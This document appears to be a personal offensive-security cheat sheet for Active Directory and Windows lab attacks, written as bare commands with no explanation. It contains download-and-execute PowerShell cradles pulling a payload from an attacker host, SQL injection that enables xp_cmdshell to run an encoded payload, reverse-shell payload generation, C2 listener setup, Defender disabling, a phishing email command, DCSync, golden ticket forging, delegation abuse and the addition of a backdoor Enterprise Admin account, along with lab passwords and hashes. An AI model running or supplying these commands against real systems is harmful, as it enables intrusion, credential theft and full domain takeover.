(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:80/am.txt') | IEX
powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.45.181:80/am.txt").Content).Invoke();"

sliver:
	get certs:
	use auxiliary/gather/impersonate_ssl
	set RHOST www.google.com
	run
	
profiles new -g 192.168.45.181:443 --format shellcode --arch amd64 osep
profiles new -g 192.168.45.181 --format service psexec
profiles new -g 192.168.45.181:443 --format shared --arch amd64 dll
stage-listener --url http://192.168.45.181:8082 --profile dll
stage-listener --url https://192.168.45.181:8080 --profile osep -c /home/kali/crt.crt -k /home/kali/key.key -C deflate9 --aes-encrypt-key 'D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT' --aes-encrypt-iv '8y/B?E(G+KbPeShV'
wg -L 192.168.45.181 -l 443
wg-socks start

xfreerdp /v:192.168.214.100 /u:administrator /p:lab /clipboard /drive:share,/home/kali/

export KRB5CCNAME=ccache.ccache

execute C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
runas -d client -u administrator -P ,74Y)YZsjO6%t& -p cmd.exe -a '/c c:\users\ted\desktop\templantex.exe'

Get-DomainComputer -Unconstrained
dir \\dc03\pipe\spoolss
rubeus --in-process -t 15 monitor /interval:5 /nowrap
.\SpoolSample.exe 192.168.156.120 192.168.156.121
lsadump::dcsync /domain:infinity.com /user:infinity\pete
^ (can also do golden ticket)

net localgroup administrators infinity\ted /add

c2tc-lapsdump *

powershell encoding:
pwsh
$command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:80/am.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand

sql injection:
a'; EXECUTE sp_configure 'show advanced options', 1;-- 
a'; RECONFIGURE;-- 
a'; EXECUTE sp_configure 'xp_cmdshell', 1;-- 
a'; RECONFIGURE;-- 
a'; EXEC xp_cmdshell 'powershell -encodedcommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='-- 

sql:
sqlrecon /auth:wintoken /h:sql07 /module:smb /rhost:\\\\192.168.45.244\\somewhere
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t sql05 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
EXEC master.dbo.sp_addlinkedserver @server = N'SQL03'
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXECUTE ('EXEC master..xp_dirtree "\\192.168.45.181\test";') AT SQL03
EXECUTE ('EXECUTE sp_configure "show advanced options", 1; reconfigure;') AT SQL03
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03
EXEC ('xp_cmdshell ''powershell -encodedcommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==''') AT SQL03

feroxbuster -u http://192.168.191.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -n -E -x php html -s 200 301 302 -g -B -k

msfvenom payloads:
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.181 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -e x64/xor_dynamic -o myfile.elf
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.197 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -o myfile.elf
python3 -c 'import pty; pty.spawn("/bin/bash")'

ansible:
ansible2john credentials.vault > credentials.hash
haschat hash.hash wordlist --show
cat pw.txt | ansible-vault decrypt
$ANSIBLE_VAULT;1.1;AES256
3936363161393532623538323261663961
373662616635626332396436653365663331323032
366234356236383736366262373

swaks --body 'http://192.168.45.223/pizza.hta' --add-header "Really: 1.0" --add-header "Content-Type: text/html" --header "Subject: Important" -t will@tricky.com -f jim@tricky.com --server 192.168.186.159

sudo docker compose --env-file .env up

export KRB5CCNAME=./Administrator.ccache

powerview:
Add-DomainObjectAcl -TargetIdentity mailadmins -principalidentity sqlsvc -Rights All
add-domaingroupmember -identity mailadmins -members sqlsvc
get-domainSID
Get-DomainGroup -Domain comply.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
get-domaintrust

env | grep KRB5CCNAME
kinit
klist
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
kvno MSSQLSvc/DC01.corp1.com:1433
ktutil
addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
wkt /tmp/administrator.keytab
quit
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
kinit -R <- renew
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
sudo proxychains crackmapexec smb 172.16.245.0/24 -u 'pete@COMPLYEDGE.COM' -k
~!!! you sometimes have to manually go on target, specify hostname!!!~

impacket-psexec -k -no-pass 'complyedge.com/pete'@dmzdc01.complyedge.com
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt
get-domainSID
Get-DomainGroup -Domain comply.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
get-domaintrust
Get-DomainTrust -Domain corp1.com
Get-DomainTrustMapping
Get-DomainUser -Domain corp2.com
Get-DomainForeignGroupMember -Domain corp2.com
convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601

domain forest bidirectional trust
kerberos::golden /user:administrator /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt (or /export)
.\Rubeus.exe ptt /ticket:ticket.kirbi

generice write:
$ComputerSid = Get-DomainComputer FILE06 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer JUMP09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer jump09 -Properties 'msds-allowedtoactonbehalfofotheridentity'
	output: 
	msds-allowedtoactonbehalfofotheridentity
	----------------------------------------
	{1, 0, 4, 128...}
	
#generic write
rubeus s4u /user:FILE06 /rc4:257df2a015598f648885526f56473014 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.comply.com /domain:ops.comply.com /ptt (/nowrap)
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
rubeus -- asktgt /user:FILE06$ /ntlm:4d5be97087535f3ba9c3a2d4d6524c3e /nowrap

rubeus --in-process s4u /impersonateuser:administrator /domain:jump09.ops.comply.com /msdsspn:cifs/JUMP09.OPS.COMPLY.COM /ticket:doIE9DCCBPC /ptt /dc:172.16.221.165

generice write/write-all from computer account:
proxychains impacket-rbcd -action write -delegate-to "JUMP09$" -delegate-from "FILE06$" ops.comply.com/file06\$ -hashes :4d5be97087535f3ba9c3a2d4d6524c3e -dc-ip 172.16.221.165

.\rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/JUMP09.OPS.COMPLY.COM /user:FILE06$ /ticket:doIE9DCCBPCgAwIBt /nowrap
./rubeustoccache.py 'doIGGjC
proxychains impacket-psexec -k -target-ip 172.16.221.167 -dc-ip 172.16.221.165  jump09.ops.comply.com

proxychains impacket-getST -spn cifs/jump09.ops.comply.com ops.comply.com/file06\$ -impersonate Administrator -dc-ip 172.16.221.165 -hashes :4d5be97087535f3ba9c3a2d4d6524c3e

export KRB5CCNAME=./Administrator.ccache

Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

lsadump::lsa /inject /name:krbtgt
lsadump::dcsync /domain:prod.corp1.com /user:corp1$
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
Get-DomainSID -Domain prod.corp1.com
Get-DomainSid -Domain ops.comply.com
Get-DomainGroup -Domain comply.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
kerberos::golden /user:oran /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt

try psexec from internal linux host. OR try adding enterprise admin
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -domain comply.com
Add-DomainGroupMember -Identity 'Enterprise Admins' -Members 'harmj0y2' -domain comply

powerup:
Invoke-PrivescAudit
(might have to modify service to start as system and interact with desktop)

proxychains crackmapexec ssh 172.16.170.0/24 -u tommy@final.com -p '89dsfsji43A'



EXEC master.dbo.sp_addlinkedserver @server = N'SQL11'
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXECUTE ('EXEC master..xp_dirtree "\\192.168.45.244\test";') AT SQL03
EXECUTE ('EXECUTE sp_configure "show advanced options", 1;') AT SQL03
EXECUTE ('RECONFIGURE;') AT SQL03
EXECUTE ('EXECUTE sp_configure "xp_cmdshell", 1;') AT SQL03

resolve dc dns: systemd-resolve --status | grep "DNS Servers"
resolve ip to host: nmblookup -A 172.16.242.168

look for basics, cred re-use, admin hash re-use, back to the basics sometimes
